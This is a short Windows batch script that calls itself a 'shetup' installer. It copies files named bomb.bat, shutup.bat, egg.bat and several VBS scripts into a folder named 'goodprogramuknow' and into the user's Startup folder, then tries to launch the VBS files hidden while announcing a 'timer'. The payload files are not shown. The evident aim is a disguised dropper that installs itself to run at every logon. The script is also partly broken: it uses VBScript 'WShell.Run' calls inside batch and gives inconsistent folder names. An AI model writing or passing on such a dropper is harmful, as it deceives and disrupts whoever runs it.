@echo off
COLOR 0B
echo press any key to start shetup
pause

echo installing...

set shetupfolder=%CD%

set goodpr=C:%HOMEPATH%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

echo [for debugging]

echo installing from %shetupfolder%
echo to %goodpr%

echo [for debugging]


xcopy "%shetupfolder%\shutup.bat" C:\goodprogramuknow /I /Y
xcopy "%shetupfolder%\vbs2.vbs" "%goodpr%" /I /Y
xcopy "%shetupfolder%\egg.bat" C:\goodprogramuknow /I /Y
xcopy "%shetupfolder%\bomb.bat" C:\goodprogramuknow /I /Y
xcopy "%shetupfolder%\vbs.vbs" "%goodpr%" /I /Y
xcopy "%shetupfolder%\vbs3.vbs" "C:\goodprogramknow" /I /Y
xcopy "%shetupfolder%\eggrun.bat" "C:\goodprogramknow" /I /Y
echo finished
echo press key to start timer
WShell.Run C:\goodprogramuknow\vbs.vbs, 0
pause

WShell.Run "C:\%goodpr%\vbs2.vbs", 0
exit  